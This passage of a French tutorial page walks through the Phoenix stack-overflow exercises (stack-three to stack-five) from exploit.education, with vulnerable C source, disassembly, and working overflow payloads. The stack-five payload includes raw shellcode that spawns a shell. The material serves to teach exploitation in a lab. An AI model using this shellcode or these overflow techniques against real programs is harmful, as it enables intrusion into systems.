+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Welcome</span> <span class="n">to</span> <span class="n">phoenix</span><span class="o">/</span><span class="n">stack</span><span class="o">-</span><span class="n">two</span><span class="p">,</span> <span class="n">brought</span> <span class="n">to</span> <span class="n">you</span> <span class="n">by</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">exploit</span><span class="o">.</span><span class="n">education</span>
+<span class="n">Well</span> <span class="n">done</span><span class="p">,</span> <span class="n">you</span> <span class="n">have</span> <span class="n">successfully</span> <span class="nb">set</span> <span class="n">changeme</span> <span class="n">to</span> <span class="n">the</span> <span class="n">correct</span> <span class="n">value</span>
+</pre></div>
+</div>
+</section>
+<section id="stack-three">
+<h2>Stack-Three<a class="headerlink" href="#stack-three" title="Lien vers cette rubrique">#</a></h2>
+<ul class="simple">
+<li><p>Le code:</p></li>
+</ul>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;err.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+
+<span class="cp">#define BANNER \</span>
+<span class="cp">  &quot;Welcome to &quot; LEVELNAME &quot;, brought to you by https:</span><span class="c1">//exploit.education&quot;</span>
+
+<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="nf">gets</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">);</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">complete_level</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Congratulations, you&#39;ve finished &quot;</span><span class="w"> </span><span class="n">LEVELNAME</span><span class="w"> </span><span class="s">&quot; :-) Well done!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<span class="w">    </span><span class="k">volatile</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="n">locals</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BANNER</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">locals</span><span class="p">.</span><span class="n">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">locals</span><span class="p">.</span><span class="n">buffer</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">locals</span><span class="p">.</span><span class="n">fp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;calling function pointer @ %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">locals</span><span class="p">.</span><span class="n">fp</span><span class="p">);</span>
+<span class="w">    </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+<span class="w">    </span><span class="n">locals</span><span class="p">.</span><span class="n">fp</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;function pointer remains unmodified :~( better luck next time!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>C’est toujours la même histoire, mais ici, on doit écrire <strong>8 octets</strong> correspondant à l’adresse de la fonction <code class="docutils literal notranslate"><span class="pre">complete_level()</span></code>.</p></li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>user@phoenix-amd64:~$<span class="w"> </span>nm<span class="w"> </span>/opt/phoenix/amd64/stack-three
+...
+000000000040069d<span class="w"> </span>T<span class="w"> </span>complete_level
+...
+</pre></div>
+</div>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>user@phoenix-amd64:~$<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print(&quot;E&quot;*64+&quot;\x9d\x06\x40\x00\x00\x00\x00\x00&quot;)&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/opt/phoenix/amd64/stack-three
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Welcome</span> <span class="n">to</span> <span class="n">phoenix</span><span class="o">/</span><span class="n">stack</span><span class="o">-</span><span class="n">three</span><span class="p">,</span> <span class="n">brought</span> <span class="n">to</span> <span class="n">you</span> <span class="n">by</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">exploit</span><span class="o">.</span><span class="n">education</span>
+<span class="n">calling</span> <span class="n">function</span> <span class="n">pointer</span> <span class="o">@</span> <span class="mh">0x40069d</span>
+<span class="n">Congratulations</span><span class="p">,</span> <span class="n">you</span><span class="s1">&#39;ve finished phoenix/stack-three :-) Well done!</span>
+</pre></div>
+</div>
+</section>
+<section id="stack-four">
+<h2>Stack-Four<a class="headerlink" href="#stack-four" title="Lien vers cette rubrique">#</a></h2>
+<ul class="simple">
+<li><p>Le code:</p></li>
+</ul>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;err.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+
+<span class="cp">#define BANNER \</span>
+<span class="cp">  &quot;Welcome to &quot; LEVELNAME &quot;, brought to you by https:</span><span class="c1">//exploit.education&quot;</span>
+
+<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="nf">gets</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">);</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">complete_level</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Congratulations, you&#39;ve finished &quot;</span><span class="w"> </span><span class="n">LEVELNAME</span><span class="w"> </span><span class="s">&quot; :-) Well done!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">start_level</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">ret</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;and will be returning to %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ret</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BANNER</span><span class="p">);</span>
+<span class="w">  </span><span class="n">start_level</span><span class="p">();</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>On n’a plus la struct, autrement dit le compilateur peut choisir l’ordre qui lui va.</p></li>
+<li><p>Maintenant, on doit réécrire l’adresse de retour <code class="docutils literal notranslate"><span class="pre">push</span></code> par l’instruction <code class="docutils literal notranslate"><span class="pre">call</span> <span class="pre">start_level()</span></code> pour <strong>retourner</strong> vers <code class="docutils literal notranslate"><span class="pre">complete_level()</span></code> au lieu de <code class="docutils literal notranslate"><span class="pre">main()</span></code>.</p></li>
+<li><p>Sachant que la pile doit être alignée sur 16 et que le compilateur peut sauvegarder des registres dans la pile, on ne peut pas calculer directement le nombre d’octets nécessaires sans voir le code assembleur.</p></li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>user@phoenix-amd64:~$<span class="w"> </span>objdump<span class="w"> </span>--disassemble<span class="w"> </span>/opt/phoenix/amd64/stack-four<span class="w"> </span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>0000000000400635 &lt;start_level&gt;:
+  400635:	55                   	push   %rbp
+  400636:	48 89 e5             	mov    %rsp,%rbp
+  400639:	48 83 ec 50          	sub    $0x50,%rsp 
+  40063d:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
+  400641:	48 89 c7             	mov    %rax,%rdi
+  400644:	e8 27 fe ff ff       	callq  400470 &lt;gets@plt&gt;
+  400649:	48 8b 45 08          	mov    0x8(%rbp),%rax
+  40064d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+  400651:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+  400655:	48 89 c6             	mov    %rax,%rsi
+  400658:	bf 33 07 40 00       	mov    $0x400733,%edi
+  40065d:	b8 00 00 00 00       	mov    $0x0,%eax
+  400662:	e8 f9 fd ff ff       	callq  400460 &lt;printf@plt&gt;
+  400667:	90                   	nop
+  400668:	c9                   	leaveq 
+  400669:	c3                   	retq   
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>On voit que <code class="docutils literal notranslate"><span class="pre">%rbp</span></code> fut push dans la pile.</p></li>
+<li><p>L’instruction <code class="docutils literal notranslate"><span class="pre">sub</span></code> nous dit que <strong>0x50=80</strong> octets furent alloués. Et la préparation de l’appel à <code class="docutils literal notranslate"><span class="pre">gets(buffer);</span></code> nous permet de savoir que notre buffer commence au sommet de la pile (l’adresse la plus basse).</p></li>
+<li><p>Pour ainsi dire, on doit écrire <strong>80+8</strong> octets avant d’arriver à l’adresse de retour.</p></li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>user@phoenix-amd64:~$<span class="w"> </span>nm<span class="w"> </span>/opt/phoenix/amd64/stack-four<span class="w">  </span>
+...
+000000000040061d<span class="w"> </span>T<span class="w"> </span>complete_level
+...
+</pre></div>
+</div>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>user@phoenix-amd64:~$<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print(&quot;E&quot;*88+&quot;\x1d\x06\x40\x00\x00\x00\x00\x00&quot;)&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/opt/phoenix/amd64/stack-four<span class="w"> </span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Welcome</span> <span class="n">to</span> <span class="n">phoenix</span><span class="o">/</span><span class="n">stack</span><span class="o">-</span><span class="n">four</span><span class="p">,</span> <span class="n">brought</span> <span class="n">to</span> <span class="n">you</span> <span class="n">by</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">exploit</span><span class="o">.</span><span class="n">education</span>
+<span class="ow">and</span> <span class="n">will</span> <span class="n">be</span> <span class="n">returning</span> <span class="n">to</span> <span class="mh">0x40061d</span>
+<span class="n">Congratulations</span><span class="p">,</span> <span class="n">you</span><span class="s1">&#39;ve finished phoenix/stack-four :-) Well done!</span>
+</pre></div>
+</div>
+<blockquote>
+<div><p>Il faut que vous sachiez que ce n’est pas toutes les architectures CPU qui enregistrent l’adresse de retour dans la pile. Souvent il existe ce qu’on appelle le <a class="reference external" href="https://en.wikipedia.org/wiki/Link_register">link register</a> qui se charge de garder l’adresse de retour au lieu de faire des accès mémoires !</p>
+</div></blockquote>
+</section>
+<section id="stack-five">
+<h2>Stack-Five<a class="headerlink" href="#stack-five" title="Lien vers cette rubrique">#</a></h2>
+<ul class="simple">
+<li><p>Le code:</p></li>
+</ul>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+
+<span class="cp">#define BANNER \</span>
+<span class="cp">  &quot;Welcome to &quot; LEVELNAME &quot;, brought to you by https:</span><span class="c1">//exploit.education&quot;</span>
+
+<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="nf">gets</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">);</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">start_level</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BANNER</span><span class="p">);</span>
+<span class="w">  </span><span class="n">start_level</span><span class="p">();</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Alors, ici, on doit toujours réécrire l’adresse de retour enregistrée dans la pile. En revanche, on doit rediriger l’exécution vers du code qu’on charge dans le buffer.</p></li>
+<li><p>Pour cela, on doit connaitre l’adresse exacte où est situé notre buffer en passant par <strong>gdb</strong>. Mais avant, on peut préparer le terrain en utilisant <code class="docutils literal notranslate"><span class="pre">objdump</span></code>.</p></li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>user@phoenix-amd64:~$<span class="w"> </span>objdump<span class="w"> </span>--disassemble<span class="w"> </span>/opt/phoenix/amd64/stack-five<span class="w"> </span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>000000000040058d &lt;start_level&gt;:
+  40058d:	55                   	push   %rbp
+  40058e:	48 89 e5             	mov    %rsp,%rbp
+  400591:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
+  400595:	48 8d 45 80          	lea    -0x80(%rbp),%rax
+  400599:	48 89 c7             	mov    %rax,%rdi
+  40059c:	e8 4f fe ff ff       	callq  4003f0 &lt;gets@plt&gt;
+  4005a1:	90                   	nop
+  4005a2:	c9                   	leaveq 
+  4005a3:	c3                   	retq   
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Alors, l’instruction <code class="docutils literal notranslate"><span class="pre">add</span>&#160;&#160;&#160; <span class="pre">$0xffffffffffffff80,%rsp</span></code> est équivalente à <code class="docutils literal notranslate"><span class="pre">sub</span> <span class="pre">$0x80,</span> <span class="pre">%rsp</span></code>, autrement dit, on alloue 128 octets (la taille du buffer). Et l’appel à <code class="docutils literal notranslate"><span class="pre">gets()</span></code> nous confirme que le buffer commence bel et bien à <code class="docutils literal notranslate"><span class="pre">%rsp</span> <span class="pre">==</span> <span class="pre">%rbp</span> <span class="pre">-</span> <span class="pre">0x80</span></code>. Avec cela, on peut calculer le nombre d’octets nécessaires pour arriver à l’adresse de retour.</p>
+<ul>
+<li><p>128 octets + 8 octets du rbp sauvegardé = 136 octets avant l’adresse de retour.</p></li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<div><p>Vous pouvez aussi inspecter la mémoire quand gdb est dans <code class="docutils literal notranslate"><span class="pre">start_level</span></code> pour voir où se trouve l’adresse de l’instruction juste après <code class="docutils literal notranslate"><span class="pre">call</span> <span class="pre">start_level</span></code> dans <code class="docutils literal notranslate"><span class="pre">main()</span></code> et calculer la différence entre elle et l’adresse du buffer.</p>
+</div></blockquote>
+<ul class="simple">
+<li><p>Le gdb de la VM n’aime pas avoir du python comme entrée, du coup je crée une variable d’environnement qui stockera un shellcode de <strong>57 octets</strong> et <strong>79 “E”</strong>, vu que l’adresse du buffer contiendra des zéros, on la passera directement via un <code class="docutils literal notranslate"><span class="pre">echo</span> <span class="pre">-ne</span></code> ou un <code class="docutils literal notranslate"><span class="pre">printf</span></code>.</p></li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">fill</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05&quot;</span><span class="k">$(</span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print(&quot;E&quot;*79)&#39;</span><span class="k">))</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Les variables d’environnement sont chargées en mémoire au-dessus de la pile, une modification de ces dernières décalera le début de la pile, et changera l’adresse où commence le buffer.</p></li>
+<li><p>En lançant <strong>gdb</strong> faites toujours en sorte d’exécuter ses instructions avant <code class="docutils literal notranslate"><span class="pre">run</span></code> ou <code class="docutils literal notranslate"><span class="pre">start</span></code>, pour avoir le même début de pile que si on exécute le code via le terminal:</p></li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="w">    </span>user@phoenix-amd64:~$<span class="w"> </span>gdb<span class="w"> </span>/opt/phoenix/amd64/stack-five
+<span class="w">    </span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">unset</span><span class="w"> </span>env<span class="w"> </span>LINES
+<span class="w">    </span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">unset</span><span class="w"> </span>env<span class="w"> </span>COLUMNS
+<span class="w">    </span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>env<span class="w"> </span><span class="nv">_</span><span class="o">=</span>/opt/phoenix/amd64/stack-five
+<span class="w">    </span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>b<span class="w"> </span>*start_level+20<span class="w"> </span><span class="c1"># c&#39;est l&#39;adresse de l&#39;instruction nop dans start_level (4005a1)</span>
+<span class="w">    </span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span>&lt;<span class="w"> </span>&lt;<span class="o">(</span><span class="nb">printf</span><span class="w"> </span><span class="nv">$fill</span><span class="s2">&quot;\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF&quot;</span><span class="o">)</span><span class="w"> </span><span class="c1"># juste pour tester</span>
+</pre></div>
+</div>
+<blockquote>
+<div><p>On utilise <code class="docutils literal notranslate"><span class="pre">&lt;()</span></code> pour la substitution de processus et non <code class="docutils literal notranslate"><span class="pre">$()</span></code>, afin de conserver les caractères spéciaux. Sachez qu’avec <code class="docutils literal notranslate"><span class="pre">$()</span></code>, le shell interprète la sortie du sous-processus comme une chaîne de caractères, ce qui peut entraîner la perte de caractères nuls <code class="docutils literal notranslate"><span class="pre">\x00</span></code> et d’autres caractères spéciaux. Avec <code class="docutils literal notranslate"><span class="pre">&lt;()</span></code>, on crée un fichier temporaire qui conserve tous les caractères dans leur forme brute, y compris les caractères nuls et autres caractères spéciaux (référence : <a class="reference external" href="https://www.gnu.org/software/bash/manual/bash.html#Process-Substitution">GNU</a>).</p>
+</div></blockquote>
+<ul class="simple">
+<li><p>Et là, on retient l’adresse de <code class="docutils literal notranslate"><span class="pre">%rsp</span></code>:<code class="docutils literal notranslate"><span class="pre">0x00007fffffffe450</span></code> (elle est sûrement différente chez vous !!). On peut faire deux <code class="docutils literal notranslate"><span class="pre">stepi</span></code> pour arriver à <code class="docutils literal notranslate"><span class="pre">ret</span></code>, là on remarque que la valeur pointée par <code class="docutils literal notranslate"><span class="pre">%rsp</span></code>=<code class="docutils literal notranslate"><span class="pre">0xffffffffffffffff</span></code>, et que gdb affiche <code class="docutils literal notranslate"><span class="pre">Cannot</span> <span class="pre">disassemble</span> <span class="pre">from</span> <span class="pre">$PC</span></code> vu que l’adresse de retour pointe vers de l’espace kernel.</p></li>
+<li><p>En relançant gdb en écrivant la bonne adresse du buffer à la place de l’adresse de retour, on obtient:</p></li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">unset</span><span class="w"> </span>env<span class="w"> </span>LINES
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">unset</span><span class="w"> </span>env<span class="w"> </span>COLUMNS
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>env<span class="w"> </span><span class="nv">_</span><span class="o">=</span>/opt/phoenix/amd64/stack-five
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span>&lt;<span class="w"> </span>&lt;<span class="o">(</span><span class="nb">printf</span><span class="w"> </span><span class="nv">$fill</span><span class="s2">&quot;\x50\xe4\xff\xff\xff\x7f\x00\x00&quot;</span><span class="o">)</span>
+
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/phoenix/amd64/stack-five<span class="w"> </span>&lt;<span class="w"> </span>&lt;<span class="o">(</span><span class="nb">printf</span><span class="w"> </span><span class="nv">$fill</span><span class="s2">&quot;\x50\xe4\xff\xff\xff\x7f\x00\x00&quot;</span><span class="o">)</span>
+Welcome<span class="w"> </span>to<span class="w"> </span>phoenix/stack-five,<span class="w"> </span>brought<span class="w"> </span>to<span class="w"> </span>you<span class="w"> </span>by<span class="w"> </span>https://exploit.education
+process<span class="w"> </span><span class="m">428</span><span class="w"> </span>is<span class="w"> </span>executing<span class="w"> </span>new<span class="w"> </span>program:<span class="w"> </span>/bin/dash
+warning:<span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>load<span class="w"> </span>shared<span class="w"> </span>library<span class="w"> </span>symbols<span class="w"> </span><span class="k">for</span><span class="w"> </span>linux-vdso.so.1.
+Do<span class="w"> </span>you<span class="w"> </span>need<span class="w"> </span><span class="s2">&quot;set solib-search-path&quot;</span><span class="w"> </span>or<span class="w"> </span><span class="s2">&quot;set sysroot&quot;</span>?
+
+$<span class="w"> </span><span class="c1"># shell started</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Quand vous lancerez le programme depuis le terminal, utilisez le chemin absolu pour avoir la même valeur pour la variable <code class="docutils literal notranslate"><span class="pre">_</span></code> que ce qu’on a mis sur gdb.</p></li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>user@phoenix-amd64:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$fill</span><span class="s2">\x50\xe4\xff\xff\xff\x7f\x00\x00&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/opt/phoenix/amd64/stack-five<span class="w"> </span>
+$<span class="w"> </span><span class="c1"># shell started</span>
+</pre></div>
+</div>
+<blockquote>
+<div><p>Si ca ne marche pas avec <code class="docutils literal notranslate"><span class="pre">start</span></code> alors que le shellcode est bel et bien exécuté, essayez avec <code class="docutils literal notranslate"><span class="pre">run</span></code> et en utilisant un fichier au lieu d’une commande bash:</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>user@phoenix-amd64:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$fill</span><span class="s2">\x50\xe4\xff\xff\xff\x7f\x00\x00&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>input-stack-five.txt
+user@phoenix-amd64:~$<span class="w"> </span>gdb<span class="w"> </span>/opt/phoenix/amd64/stack-five
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">unset</span><span class="w"> </span>env<span class="w"> </span>LINES
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">unset</span><span class="w"> </span>env<span class="w"> </span>COLUMNS
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>env<span class="w"> </span><span class="nv">_</span><span class="o">=</span>/opt/phoenix/amd64/stack-five
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>start<span class="w"> </span>&lt;<span class="w"> </span>./input-stack-five.txt
+</pre></div>
+</div>
+</div></blockquote>
+</section>
+</section>
+
+
+                </article>
+              
+
+              
+              
+              
+              
+                <footer class="prev-next-footer d-print-none">
+                  
+<div class="prev-next-area">
+    <a class="left-prev"
+       href="x86_64-LesFonctions.html"
+       title="page précédente">
+      <i class="fa-solid fa-angle-left"></i>
+      <div class="prev-next-info">
+        <p class="prev-next-subtitle">précédent</p>
+        <p class="prev-next-title">Les fonctions en x86_64</p>
+      </div>
+    </a>
+</div>
+                </footer>
+              
+            </div>
+            
+            
+              
+                <dialog id="pst-secondary-sidebar-modal"></dialog>
+                <div id="pst-secondary-sidebar" class="bd-sidebar-secondary bd-toc"><div class="sidebar-secondary-items sidebar-secondary__inner">
+
+
+  <div class="sidebar-secondary-item">
+  <div class="page-toc tocsection onthispage">
+    <i class="fa-solid fa-list"></i> Contenu
+  </div>
+  <nav class="bd-toc-nav page-toc">
+    <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mise-en-route">Mise en route</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#notes-importantes">Notes importantes</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#rappels-gdb">Rappels gdb</a></li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#stack-zero">Stack-zero</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#stack-one">Stack-one</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#stack-two">Stack-Two</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#stack-three">Stack-Three</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#stack-four">Stack-Four</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#stack-five">Stack-Five</a></li>
+</ul>
+  </nav></div>
+
+</div></div>
+              
+            
+          </div>
+          <footer class="bd-footer-content">
+            
+<div class="bd-footer-content__inner container">
+  
+  <div class="footer-item">
+    
+<p class="component-author">
+Par Mazigh
+</p>
+
+  </div>
+  
+  <div class="footer-item">
+    
+
+  <p class="copyright">
+    
+      © Copyright 2024, Mazigh.
+      <br/>
+    
+  </p>
+
+  </div>
+  
+  <div class="footer-item">
+    
+  </div>
+  
+  <div class="footer-item">
+    
+  </div>
+  
+</div>
+          </footer>
+        
+
+      </main>
+    </div>
+  </div>
+  
+  <!-- Scripts loaded after <body> so the DOM is not blocked -->
+  <script defer src="_static/scripts/bootstrap.js?digest=8878045cc6db502f8baf"></script>
+<script defer src="_static/scripts/pydata-sphinx-theme.js?digest=8878045cc6db502f8baf"></script>
+
